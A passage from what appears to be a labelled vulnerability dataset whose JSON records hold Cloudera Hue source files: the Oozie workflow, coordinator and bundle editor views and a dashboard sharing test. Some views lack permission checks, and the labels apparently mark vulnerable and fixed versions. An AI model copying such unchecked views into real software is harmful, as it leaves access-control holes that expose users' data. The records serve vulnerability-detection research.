doc.doc.get().id if doc else -1,\n      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))      \n  })\n\n\ndef new_bundle(request):\n  return edit_bundle(request)\n\n\n@check_document_modify_permission()\ndef save_bundle(request):\n  response = {'status': -1}\n\n  bundle_data = json.loads(request.POST.get('bundle', '{}'))\n\n  if bundle_data.get('id'):\n    bundle_doc = Document2.objects.get(id=bundle_data['id'])\n  else:      \n    bundle_doc = Document2.objects.create(name=bundle_data['name'], uuid=bundle_data['uuid'], type='oozie-bundle2', owner=request.user)\n    Document.objects.link(bundle_doc, owner=bundle_doc.owner, name=bundle_doc.name, description=bundle_doc.description, extra='bundle2')\n\n  if bundle_data['coordinators']:\n    dependencies = Document2.objects.filter(type='oozie-coordinator2', uuid__in=[c['coordinator'] for c in bundle_data['coordinators']])\n    for doc in dependencies:\n      doc.doc.get().can_read_or_exception(request.user)    \n    bundle_doc.dependencies = dependencies\n\n  bundle_doc.update_data(bundle_data)\n  bundle_doc.name = bundle_data['name']\n  bundle_doc.save()\n  \n  response['status'] = 0\n  response['id'] = bundle_doc.id\n  response['message'] = _('Saved !')\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_access_permission()\ndef submit_bundle(request, doc_id):\n  bundle = Bundle(document=Document2.objects.get(id=doc_id))  \n  ParametersFormSet = formset_factory(ParameterForm, extra=0)\n\n  if request.method == 'POST':\n    params_form = ParametersFormSet(request.POST)\n\n    if params_form.is_valid():\n      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])\n      job_id = _submit_bundle(request, bundle, mapping)\n\n      request.info(_('Bundle submitted.'))\n      return redirect(reverse('oozie:list_oozie_bundle', kwargs={'job_id': job_id}))\n    else:\n      request.error(_('Invalid submission form: %s' % params_form.errors))\n  else:\n    parameters = bundle.find_all_parameters()\n    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))\n    params_form = ParametersFormSet(initial=initial_params)\n\n  popup = render('editor/submit_job_popup.mako', request, {\n                 'params_form': params_form,\n                 'action': reverse('oozie:editor_submit_bundle',  kwargs={'doc_id': bundle.id})\n                }, force_template=True).content\n  return HttpResponse(json.dumps(popup), mimetype=\"application/json\")\n\n\ndef _submit_bundle(request, bundle, properties):\n  try:\n    deployment_mapping = {}\n    coords = dict([(c.uuid, c) for c in Document2.objects.filter(type='oozie-coordinator2', uuid__in=[b['coordinator'] for b in bundle.data['coordinators']])])\n    \n    for i, bundled in enumerate(bundle.data['coordinators']):\n      coord = coords[bundled['coordinator']]\n      workflow = Workflow(document=coord.dependencies.all()[0])\n      wf_dir = Submission(request.user, workflow, request.fs, request.jt, properties).deploy()      \n      deployment_mapping['wf_%s_dir' % i] = request.fs.get_hdfs_path(wf_dir)\n      \n      coordinator = Coordinator(document=coord)\n      coord_dir = Submission(request.user, coordinator, request.fs, request.jt, properties).deploy()\n      deployment_mapping['coord_%s_dir' % i] = coord_dir\n      deployment_mapping['coord_%s' % i] = coord\n\n    properties.update(deployment_mapping)\n    \n    submission = Submission(request.user, bundle, request.fs, request.jt, properties=properties)\n    job_id = submission.run()\n\n    return job_id\n  except RestException, ex:\n    raise PopupException(_(\"Error submitting bundle %s\") % (bundle,), detail=ex._headers.get('oozie-error-message', ex))\n\n/n/n/n", "label": 0}, {"id": "6641c62beaa1468082e47d82da5ed758d11c7735", "code": "/apps/oozie/src/oozie/views/editor2.py/n/n#!/usr/bin/env python\n# Licensed to Cloudera, Inc. under one\n# or more contributor license agreements.  See the NOTICE file\n# distributed with this work for additional information\n# regarding copyright ownership.  Cloudera, Inc. licenses this file\n# to you under the Apache License, Version 2.0 (the\n# \"License\"); you may not use this file except in compliance\n# with the License.  You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport json\nimport logging\nimport uuid\n\nfrom django.core.urlresolvers import reverse\nfrom django.forms.formsets import formset_factory\nfrom django.http import HttpResponse\nfrom django.shortcuts import redirect\nfrom django.utils.translation import ugettext as _\n\nfrom desktop.lib.django_util import render\nfrom desktop.lib.exceptions_renderable import PopupException\nfrom desktop.lib.i18n import smart_str\nfrom desktop.lib.rest.http_client import RestException\nfrom desktop.models import Document, Document2\n\nfrom liboozie.credentials import Credentials\nfrom liboozie.oozie_api import get_oozie\nfrom liboozie.submission2 import Submission\n\nfrom oozie.decorators import check_document_access_permission, check_document_modify_permission\nfrom oozie.forms import ParameterForm\nfrom oozie.models2 import Node, Workflow, Coordinator, Bundle, NODES, WORKFLOW_NODE_PROPERTIES, import_workflows_from_hue_3_7,\\\n    find_dollar_variables, find_dollar_braced_variables\n\n\nLOG = logging.getLogger(__name__)\n\n\n\ndef list_editor_workflows(request):  \n  workflows = [d.content_object.to_dict() for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')]\n\n  return render('editor/list_editor_workflows.mako', request, {\n      'workflows_json': json.dumps(workflows)\n  })\n\n\n@check_document_access_permission()\ndef edit_workflow(request):\n  workflow_id = request.GET.get('workflow')\n  \n  if workflow_id:\n    wid = {}\n    if workflow_id.isdigit():\n      wid['id'] = workflow_id\n    else:\n      wid['uuid'] = workflow_id\n    doc = Document2.objects.get(type='oozie-workflow2', **wid)\n    workflow = Workflow(document=doc)\n  else:\n    doc = None\n    workflow = Workflow()\n    workflow.set_workspace(request.user)\n    workflow.check_workspace(request.fs, request.user)\n  \n  workflow_data = workflow.get_data()\n\n  api = get_oozie(request.user)\n  credentials = Credentials()\n  \n  try:  \n    credentials.fetch(api)\n  except Exception, e:\n    LOG.error(smart_str(e))\n\n  return render('editor/workflow_editor.mako', request, {\n      'layout_json': json.dumps(workflow_data['layout']),\n      'workflow_json': json.dumps(workflow_data['workflow']),\n      'credentials_json': json.dumps(credentials.credentials.keys()),\n      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES),\n      'doc1_id': doc.doc.get().id if doc else -1,\n      'subworkflows_json': json.dumps(_get_workflows(request.user)),\n      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))\n  })\n\n\ndef new_workflow(request):\n  return edit_workflow(request)\n\n\ndef delete_workflow(request):\n  if request.method != 'POST':\n    raise PopupException(_('A POST request is required.'))\n\n  jobs = json.loads(request.POST.get('selection'))\n\n  for job in jobs:\n    doc2 = Document2.objects.get(id=job['id'])\n    doc = doc2.doc.get()\n    doc.can_write_or_exception(request.user)\n    \n    doc.delete()\n    doc2.delete()\n\n  response = {}\n  request.info(_('Workflows deleted.') if len(jobs) > 1 else _('Workflow deleted.'))\n  \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_access_permission()\ndef copy_workflow(request):\n  if request.method != 'POST':\n    raise PopupException(_('A POST request is required.'))\n\n  jobs = json.loads(request.POST.get('selection'))\n\n  for job in jobs:\n    doc2 = Document2.objects.get(type='oozie-workflow2', id=job['id'])\n    \n    name = doc2.name + '-copy'\n    copy_doc = doc2.doc.get().copy(name=name, owner=request.user)\n  \n    doc2.pk = None\n    doc2.id = None\n    doc2.uuid = str(uuid.uuid4())\n    doc2.name = name\n    doc2.owner = request.user    \n    doc2.save()\n  \n    doc2.doc.all().delete()\n    doc2.doc.add(copy_doc)\n    \n    workflow = Workflow(document=doc2)\n    workflow.update_name(name)\n    doc2.update_data({'workflow': workflow.get_data()['workflow']})\n    doc2.save()\n\n    workflow.set_workspace(request.user)\n    workflow.check_workspace(request.fs, request.user)\n\n  response = {}  \n  request.info(_('Workflows copied.') if len(jobs) > 1 else _('Workflow copied.'))\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_modify_permission()\ndef save_workflow(request):\n  response = {'status': -1}\n\n  workflow = json.loads(request.POST.get('workflow', '{}'))\n  layout = json.loads(request.POST.get('layout', '{}'))\n\n  if workflow.get('id'):\n    workflow_doc = Document2.objects.get(id=workflow['id'])\n  else:      \n    workflow_doc = Document2.objects.create(name=workflow['name'], uuid=workflow['uuid'], type='oozie-workflow2', owner=request.user)\n    Document.objects.link(workflow_doc, owner=workflow_doc.owner, name=workflow_doc.name, description=workflow_doc.description, extra='workflow2')\n\n  subworkflows = [node['properties']['workflow'] for node in workflow['nodes'] if node['type'] == 'subworkflow-widget']\n  if subworkflows:\n    dependencies = Document2.objects.filter(uuid__in=subworkflows)\n    workflow_doc.dependencies = dependencies\n\n  workflow_doc.update_data({'workflow': workflow})\n  workflow_doc.update_data({'layout': layout})\n  workflow_doc.name = workflow['name']\n  workflow_doc.save()\n  \n  workflow_instance = Workflow(document=workflow_doc)\n  \n  response['status'] = 0\n  response['id'] = workflow_doc.id\n  response['doc1_id'] = workflow_doc.doc.get().id\n  response['message'] = _('Page saved !')\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef new_node(request):\n  response = {'status': -1}\n\n  node = json.loads(request.POST.get('node', '{}'))\n\n  properties = NODES[node['widgetType']].get_mandatory_fields()\n  workflows = []\n\n  if node['widgetType'] == 'subworkflow-widget':\n    workflows = _get_workflows(request.user)\n\n  response['status'] = 0\n  response['properties'] = properties \n  response['workflows'] = workflows\n  \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef _get_workflows(user):\n  return [{\n        'name': workflow.name,\n        'owner': workflow.owner.username,\n        'value': workflow.uuid,\n        'id': workflow.id\n      } for workflow in [d.content_object for d in Document.objects.get_docs(user, Document2, extra='workflow2')]\n    ]  \n\n\ndef add_node(request):\n  response = {'status': -1}\n\n  node = json.loads(request.POST.get('node', '{}'))\n  properties = json.loads(request.POST.get('properties', '{}'))\n  copied_properties = json.loads(request.POST.get('copiedProperties', '{}'))\n\n  _properties = dict(NODES[node['widgetType']].get_fields())\n  _properties.update(dict([(_property['name'], _property['value']) for _property in properties]))\n\n  if copied_properties:\n    _properties.update(copied_properties)\n\n  response['status'] = 0\n  response['properties'] = _properties\n  response['name'] = '%s-%s' % (node['widgetType'].split('-')[0], node['id'][:4])\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef action_parameters(request):\n  response = {'status': -1}\n  parameters = set()\n\n  try:\n    node_data = json.loads(request.POST.get('node', '{}'))\n    \n    parameters = parameters.union(set(Node(node_data).find_parameters()))\n    \n    script_path = node_data.get('properties', {}).get('script_path', {})\n    if script_path:\n      script_path = script_path.replace('hdfs://', '')\n\n      if request.fs.do_as_user(request.user, request.fs.exists, script_path):\n        data = request.fs.do_as_user(request.user, request.fs.read, script_path, 0, 16 * 1024 ** 2)  \n\n        if node_data['type'] in ('hive', 'hive2'):\n          parameters = parameters.union(set(find_dollar_braced_variables(data)))\n        elif node_data['type'] == 'pig':\n          parameters = parameters.union(set(find_dollar_variables(data)))\n                \n    response['status'] = 0\n    response['parameters'] = list(parameters)\n  except Exception, e:\n    response['message'] = str(e)\n    \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_access_permission()\ndef workflow_parameters(request):\n  response = {'status': -1}\n\n  try:\n    workflow = Workflow(document=Document2.objects.get(type='oozie-workflow2', uuid=request.GET.get('uuid'))) \n\n    response['status'] = 0\n    response['parameters'] = workflow.find_all_parameters(with_lib_path=False)\n  except Exception, e:\n    response['message'] = str(e)\n    \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef gen_xml_workflow(request):\n  response = {'status': -1}\n\n  try:\n    workflow_json = json.loads(request.POST.get('workflow', '{}'))\n  \n    workflow = Workflow(workflow=workflow_json)\n  \n    response['status'] = 0\n    response['xml'] = workflow.to_xml()\n  except Exception, e:\n    response['message'] = str(e)\n    \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_access_permission()\ndef submit_workflow(request, doc_id):\n  workflow = Workflow(document=Document2.objects.get(id=doc_id))\n  ParametersFormSet = formset_factory(ParameterForm, extra=0)\n\n  if request.method == 'POST':\n    params_form = ParametersFormSet(request.POST)    \n\n    if params_form.is_valid():\n      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])\n\n      job_id = _submit_workflow(request.user, request.fs, request.jt, workflow, mapping)\n\n      request.info(_('Workflow submitted'))\n      return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id}))\n    else:\n      request.error(_('Invalid submission form: %s' % params_form.errors))\n  else:\n    parameters = workflow.find_all_parameters()\n    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))\n    params_form = ParametersFormSet(initial=initial_params)\n\n    popup = render('editor/submit_job_popup.mako', request, {\n                     'params_form': params_form,\n                     'action': reverse('oozie:editor_submit_workflow', kwargs={'doc_id': workflow.id})\n                   }, force_template=True).content\n    return HttpResponse(json.dumps(popup), mimetype=\"application/json\")\n\n\ndef _submit_workflow(user, fs, jt, workflow, mapping):\n  try:\n    submission = Submission(user, workflow, fs, jt, mapping)\n    job_id = submission.run()\n    return job_id\n  except RestException, ex:\n    detail = ex._headers.get('oozie-error-message', ex)\n    if 'Max retries exceeded with url' in str(detail):\n      detail = '%s: %s' % (_('The Oozie server is not running'), detail)\n    LOG.error(smart_str(detail))\n    raise PopupException(_(\"Error submitting workflow %s\") % (workflow,), detail=detail)\n\n  return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id}))\n\n\n\ndef list_editor_coordinators(request):\n  coordinators = [d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')]\n\n  return render('editor/list_editor_coordinators.mako', request, {\n      'coordinators': coordinators\n  })\n\n\n@check_document_access_permission()\ndef edit_coordinator(request):\n  coordinator_id = request.GET.get('coordinator')\n  doc = None\n  \n  if coordinator_id:\n    doc = Document2.objects.get(id=coordinator_id)\n    coordinator = Coordinator(document=doc)\n  else:\n    coordinator = Coordinator()\n\n  api = get_oozie(request.user)\n  credentials = Credentials()\n  \n  try:  \n    credentials.fetch(api)\n  except Exception, e:\n    LOG.error(smart_str(e))\n\n  workflows = [dict([('uuid', d.content_object.uuid), ('name', d.content_object.name)])\n                                    for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')]\n\n  if coordinator_id and not filter(lambda a: a['uuid'] == coordinator.data['properties']['workflow'], workflows):\n    raise PopupException(_('You don\\'t have access to the workflow of this coordinator.'))\n\n  return render('editor/coordinator_editor.mako', request, {\n      'coordinator_json': coordinator.json,\n      'credentials_json': json.dumps(credentials.credentials.keys()),\n      'workflows_json': json.dumps(workflows),\n      'doc1_id': doc.doc.get().id if doc else -1,\n      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))\n  })\n\n\ndef new_coordinator(request):\n  return edit_coordinator(request)\n\n\n@check_document_modify_permission()\ndef save_coordinator(request):\n  response = {'status': -1}\n\n  coordinator_data = json.loads(request.POST.get('coordinator', '{}'))\n\n  if coordinator_data.get('id'):\n    coordinator_doc = Document2.objects.get(id=coordinator_data['id'])\n  else:      \n    coordinator_doc = Document2.objects.create(name=coordinator_data['name'], uuid=coordinator_data['uuid'], type='oozie-coordinator2', owner=request.user)\n    Document.objects.link(coordinator_doc, owner=coordinator_doc.owner, name=coordinator_doc.name, description=coordinator_doc.description, extra='coordinator2')\n\n  if coordinator_data['properties']['workflow']:\n    dependencies = Document2.objects.filter(type='oozie-workflow2', uuid=coordinator_data['properties']['workflow'])\n    for doc in dependencies:\n      doc.doc.get().can_read_or_exception(request.user)\n    coordinator_doc.dependencies = dependencies\n\n  coordinator_doc.update_data(coordinator_data)\n  coordinator_doc.name = coordinator_data['name']\n  coordinator_doc.save()\n  \n  response['status'] = 0\n  response['id'] = coordinator_doc.id\n  response['message'] = _('Saved !')\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef gen_xml_coordinator(request):\n  response = {'status': -1}\n\n  coordinator_dict = json.loads(request.POST.get('coordinator', '{}'))\n\n  coordinator = Coordinator(data=coordinator_dict)\n\n  response['status'] = 0\n  response['xml'] = coordinator.to_xml()\n    \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\") \n\n\n@check_document_access_permission()\ndef submit_coordinator(request, doc_id):\n  coordinator = Coordinator(document=Document2.objects.get(id=doc_id))  \n  ParametersFormSet = formset_factory(ParameterForm, extra=0)\n\n  if request.method == 'POST':\n    params_form = ParametersFormSet(request.POST)\n\n    if params_form.is_valid():\n      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])\n      job_id = _submit_coordinator(request, coordinator, mapping)\n\n      request.info(_('Coordinator submitted.'))\n      return redirect(reverse('oozie:list_oozie_coordinator', kwargs={'job_id': job_id}))\n    else:\n      request.error(_('Invalid submission form: %s' % params_form.errors))\n  else:\n    parameters = coordinator.find_all_parameters()\n    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))\n    params_form = ParametersFormSet(initial=initial_params)\n\n  popup = render('editor/submit_job_popup.mako', request, {\n                 'params_form': params_form,\n                 'action': reverse('oozie:editor_submit_coordinator',  kwargs={'doc_id': coordinator.id})\n                }, force_template=True).content\n  return HttpResponse(json.dumps(popup), mimetype=\"application/json\")\n\n\ndef _submit_coordinator(request, coordinator, mapping):\n  try:\n    wf_doc = Document2.objects.get(uuid=coordinator.data['properties']['workflow'])\n    wf_dir = Submission(request.user, Workflow(document=wf_doc), request.fs, request.jt, mapping).deploy()\n\n    properties = {'wf_application_path': request.fs.get_hdfs_path(wf_dir)}\n    properties.update(mapping)\n\n    submission = Submission(request.user, coordinator, request.fs, request.jt, properties=properties)\n    job_id = submission.run()\n\n    return job_id\n  except RestException, ex:\n    raise PopupException(_(\"Error submitting coordinator %s\") % (coordinator,),\n                         detail=ex._headers.get('oozie-error-message', ex))\n    \n    \n    \n\ndef list_editor_bundles(request):\n  bundles = [d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='bundle2')]\n\n  return render('editor/list_editor_bundles.mako', request, {\n      'bundles': bundles\n  })\n\n\n@check_document_access_permission()\ndef edit_bundle(request):\n  bundle_id = request.GET.get('bundle')\n  doc = None\n  \n  if bundle_id:\n    doc = Document2.objects.get(id=bundle_id)\n    bundle = Bundle(document=doc)\n  else:\n    bundle = Bundle()\n\n  coordinators = [dict([('uuid', d.content_object.uuid), ('name', d.content_object.name)])\n                      for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')]\n\n  return render('editor/bundle_editor.mako', request, {\n      'bundle_json': bundle.json,\n      'coordinators_json': json.dumps(coordinators),\n      'doc1_id': doc.doc.get().id if doc else -1,\n      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))      \n  })\n\n\ndef new_bundle(request):\n  return edit_bundle(request)\n\n\n@check_document_modify_permission()\ndef save_bundle(request):\n  response = {'status': -1}\n\n  bundle_data = json.loads(request.POST.get('bundle', '{}'))\n\n  if bundle_data.get('id'):\n    bundle_doc = Document2.objects.get(id=bundle_data['id'])\n  else:      \n    bundle_doc = Document2.objects.create(name=bundle_data['name'], uuid=bundle_data['uuid'], type='oozie-bundle2', owner=request.user)\n    Document.objects.link(bundle_doc, owner=bundle_doc.owner, name=bundle_doc.name, description=bundle_doc.description, extra='bundle2')\n\n  if bundle_data['coordinators']:\n    dependencies = Document2.objects.filter(type='oozie-coordinator2', uuid__in=[c['coordinator'] for c in bundle_data['coordinators']])\n    for doc in dependencies:\n      doc.doc.get().can_read_or_exception(request.user)    \n    bundle_doc.dependencies = dependencies\n\n  bundle_doc.update_data(bundle_data)\n  bundle_doc.name = bundle_data['name']\n  bundle_doc.save()\n  \n  response['status'] = 0\n  response['id'] = bundle_doc.id\n  response['message'] = _('Saved !')\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_access_permission()\ndef submit_bundle(request, doc_id):\n  bundle = Bundle(document=Document2.objects.get(id=doc_id))  \n  ParametersFormSet = formset_factory(ParameterForm, extra=0)\n\n  if request.method == 'POST':\n    params_form = ParametersFormSet(request.POST)\n\n    if params_form.is_valid():\n      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])\n      job_id = _submit_bundle(request, bundle, mapping)\n\n      request.info(_('Bundle submitted.'))\n      return redirect(reverse('oozie:list_oozie_bundle', kwargs={'job_id': job_id}))\n    else:\n      request.error(_('Invalid submission form: %s' % params_form.errors))\n  else:\n    parameters = bundle.find_all_parameters()\n    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))\n    params_form = ParametersFormSet(initial=initial_params)\n\n  popup = render('editor/submit_job_popup.mako', request, {\n                 'params_form': params_form,\n                 'action': reverse('oozie:editor_submit_bundle',  kwargs={'doc_id': bundle.id})\n                }, force_template=True).content\n  return HttpResponse(json.dumps(popup), mimetype=\"application/json\")\n\n\ndef _submit_bundle(request, bundle, properties):\n  try:\n    deployment_mapping = {}\n    coords = dict([(c.uuid, c) for c in Document2.objects.filter(type='oozie-coordinator2', uuid__in=[b['coordinator'] for b in bundle.data['coordinators']])])\n    \n    for i, bundled in enumerate(bundle.data['coordinators']):\n      coord = coords[bundled['coordinator']]\n      workflow = Workflow(document=coord.dependencies.all()[0])\n      wf_dir = Submission(request.user, workflow, request.fs, request.jt, properties).deploy()      \n      deployment_mapping['wf_%s_dir' % i] = request.fs.get_hdfs_path(wf_dir)\n      \n      coordinator = Coordinator(document=coord)\n      coord_dir = Submission(request.user, coordinator, request.fs, request.jt, properties).deploy()\n      deployment_mapping['coord_%s_dir' % i] = coord_dir\n      deployment_mapping['coord_%s' % i] = coord\n\n    properties.update(deployment_mapping)\n    \n    submission = Submission(request.user, bundle, request.fs, request.jt, properties=properties)\n    job_id = submission.run()\n\n    return job_id\n  except RestException, ex:\n    raise PopupException(_(\"Error submitting bundle %s\") % (bundle,), detail=ex._headers.get('oozie-error-message', ex))\n\n/n/n/n", "label": 1}, {"id": "37b529b1f9aeb5d746599a9ed4e2288cf3ad3e1d", "code": "desktop/libs/dashboard/src/dashboard/tests.py/n/n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n# Licensed to Cloudera, Inc. under one\n# or more contributor license agreements.  See the NOTICE file\n# distributed with this work for additional information\n# regarding copyright ownership.  Cloudera, Inc. licenses this file\n# to you under the Apache License, Version 2.0 (the\n# \"License\"); you may not use this file except in compliance\n# with the License.  You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport json\n\nfrom django.contrib.auth.models import User\nfrom django.core.urlresolvers import reverse\n\nfrom nose.tools import assert_true, assert_false, assert_equal, assert_not_equal\n\nfrom desktop.lib.django_test_util import make_logged_in_client\nfrom desktop.lib.test_utils import grant_access\nfrom desktop.lib.rest import resource\nfrom desktop.models import Document2\n\nfrom dashboard.facet_builder import _round_number_range\nfrom dashboard.models import Collection2, augment_response\nfrom dashboard.controller import DashboardController\n\n\nQUERY = {'qs': [{'q': ''}], 'fqs': [], 'start': 0}\n\n\ndef test_ranges():\n  assert_equal((90.0, 100.0), _round_number_range(99))\n  assert_equal((0.0, 100.0), _round_number_range(100))\n  assert_equal((0.0, 100.0), _round_number_range(101))\n\n  assert_equal((8000000.0, 9000000.0), _round_number_range(9045352))\n\n\nclass MockResource():\n  RESPONSE = None\n\n  def __init__(self, client):\n    pass\n\n  @classmethod\n  def set_solr_response(cls, response):\n    MockResource.RESPONSE = response\n\n  def invoke(self, method, *args, **kwargs):\n    if method.lower() == 'head':\n      return self.head(*args, **kwargs)\n    elif method.lower() == 'get':\n      return self.get(*args, **kwargs)\n    else:\n      raise Exception('do not know how to handle %s' % method)\n\n  def head(self, *args, **kwargs):\n    return ''\n\n  def get(self, *args, **kwargs):\n    if 'collection_1/admin/file' in args[0]:\n      return SOLR_SCHEMA\n    elif 'collection_1/admin/luke' in args[0]:\n      if ('show', 'schema') in kwargs['params']:\n        return SOLR_LUKE_SCHEMA\n      else:\n        return SOLR_LUKE_\n    else:\n      return MockResource.RESPONSE\n\n\nclass TestSearchBase(object):\n\n  def setUp(self):\n    self.c = make_logged_in_client(username='test_dashboard', is_superuser=False)\n    self.client_not_me = make_logged_in_client(username=\"not_perm_user\", groupname=\"default\", recreate=True, is_superuser=False)\n\n    self.user = User.objects.get(username='test_dashboard')\n    self.user_not_me = User.objects.get(username=\"not_perm_user\")\n\n    grant_access('test_dashboard', 'test_dashboard', 'dashboard')\n    grant_access(self.user.username, self.user.username, \"desktop\")\n    grant_access('not_perm_user', 'not_perm_user', 'dashboard')\n    grant_access(self.user_not_me.username, self.user_not_me.username, \"desktop\")\n\n    self.home_dir = Document2.objects.get_home_directory(user=self.user)\n\n    self.prev_resource = resource.Resource\n    resource.Resource = MockResource\n\n    self.collection = Collection2(user=self.user, name='collection_1')\n\n    MockResource.set_solr_response(\"\"\"{\n      \"responseHeader\": {\n        \"status\": 0,\n        \"QTime\": 0,\n        \"params\": {\n          \"indent\": \"true\",\n          \"q\": \"*:*\",\n          \"_\": \"1442953203972\",\n          \"wt\": \"json\"\n        }\n      },\n      \"response\": {\n        \"numFound\": 1,\n        \"start\": 0,\n        \"docs\": [\n          {\n            \"id\": \"change.me\",\n            \"title\": [\n              \"val1\",\n              \"val2\",\n              \"[val3]\",\n              \"val4\"\n            ],\n            \"_version_\": 1513046095083602000\n          }\n        ]\n      }\n      }\"\"\")\n\n  def tearDown(self):\n    # Remove monkey patching\n    resource.Resource = self.prev_resource\n\n\nclass TestWithMockedSolr(TestSearchBase):\n\n  def _get_collection_param(self, collection):\n    col_json = json.loads(collection.get_json(self.user))\n    return col_json['collection']\n\n  def test_index(self):\n    response = self.c.get(reverse('dashboard:index'))\n    assert_true('dashboard' in response.content, response.content)\n\n  def test_share_dashboard(self):\n    doc = Document2.objects.create(name='test_dashboard', type='search-dashboard', owner=self.user,\n                                   data=self.collection.data, parent_directory=self.home_dir)\n\n    # owner can view document\n    response = self.c.get('/desktop/api2/doc/', {'uuid': doc.uuid})\n    data = json.loads(response.content)\n    assert_equal(doc.uuid, data['document']['uuid'], data)\n\n    # other user cannot view document\n    response = self.client_not_me.get('/desktop/api2/doc/', {'uuid': doc.uuid})\n    data = json.loads(response.content)\n    assert_equal(-1, data['status'])\n\n    # There are no collections with user_not_me\n    controller = DashboardController(self.user_not_me)\n    hue_collections = controller.get_search_collections()\n    assert_true(len(hue_collections) == 0)\n\n    # Share read perm by users\n    response = self.c.post(\"/desktop/api2/doc/share\", {\n        'uuid': json.dumps(doc.uuid),\n        'data': json.dumps({\n            'read': {\n                'user_ids': [\n                    self.user.id,\n                    self.user_not_me.id\n                ],\n                'group_ids': [],\n            },\n            'write': {\n                'user_ids': [],\n                'group_ids': [],\n            }\n        })\n    })\n    assert_equal(0, json.loads(response.content)['status'], response.content)\n    assert_true(doc.can_read(self.user))\n    assert_true(doc.can_write(self.user))\n    assert_true(doc.can_read(self.user_not_me))\n    assert_false(doc.can_write(self.user_not_me))\n\n    # other user can view document\n    response = self.client_not_me.get('/desktop/api2/doc/', {'uuid': doc.uuid})\n    data = json.loads(response.content)\n    assert_equal(doc.uuid, data['document']['uuid'], data)\n\n    # other user can open dashboard\n    response = self.c.post(reverse('dashboard:search'), {\n        'collection': json.dumps(self._get_collection_param(self.collection)),\n        'query': json.dumps(QUERY)\n    })\n\n    data = json.loads(response.content)\n    assert_true('response' in data, data)\n    assert_true('docs' in data['response'], data)\n\n    # For self.user_not_me\n    controller = DashboardController(self.user_not_me)\n    hue_collections = controller.get_search_collections()\n    assert_equal(len(hue_collections), 1)\n    assert_equal(hue_collections[0].name, 'test_dashboard')\n\n    hue_collections = controller.get_owner_search_collections()\n    assert_equal(len(hue_collections), 0)\n\n    hue_collections = controller.get_shared_search_collections()\n    assert_equal(len(hue_collections), 0)\n\n    # For self.user\n    controller = DashboardController(self.user)\n    hue_collections = controller.get_search_collections()\n    assert_equal(len(hue_collections), 1)\n    assert_equal(hue_collections[0].name, 'test_dashboard')\n\n    hue_collections = controller.get_owner_search_collections()\n    assert_equal(len(hue_collections), 1)\n    assert_equal(hue_collections[0].name, 'test_dashboard')\n\n    hue_collections = controller.get_shared_search_collections()\n    assert_equal(len(hue_collections), 1)\n    assert_equal(hue_collections[0].name, 'test_dashboard')\n\n    user_not_me_home_dir = Document2.objects.get_home_directory(user=self.user_not_me)\n    doc1 = Document2.objects.create(name='test_dashboard1', type='search-dashboard', owner=self.user_not_me,\n                                   data=self.collection.data, parent_directory=user_not_me_home_dir)\n    # self.user_not_me can view document\n    response = self.client_not_me.get('/desktop/api2/doc/', {'uuid': doc1.uuid})\n    data = json.loads(response.content)\n    assert_equal(doc1.uuid, data['document']['uuid'], data)\n\n    # self.user cannot view document\n    response = self.c.get('/desktop/api2/doc/', {'uuid': doc1.uuid})\n    data = json.loads(response.content)\n    assert_equal(-1, data['status'])\n\n    # Share read perm by users\n    response = self.client_not_me.post(\"/desktop/api2/doc/share\", {\n        'uuid': json.dumps(doc1.uuid),\n        'data': json.dumps({\n            'read': {\n                'user_ids': [\n                    self.user.id,\n                ],\n                'group_ids': [],\n            },\n            'write': {\n                'user_ids': [],\n                'group_ids': [],\n            }\n        })\n    })\n    assert_equal(0, json.loads(response.content)['status'], response.content)\n    assert_true(doc1.can_read(self.user))\n    assert_false(doc1.can_write(self.user))\n    assert_true(doc1.can_read(self.user_not_me))\n    assert_true(doc1.can_write(self.user_not_me))\n\n    # For self.user_not_me\n    controller = DashboardController(self.user_not_me)\n    hue_collections = 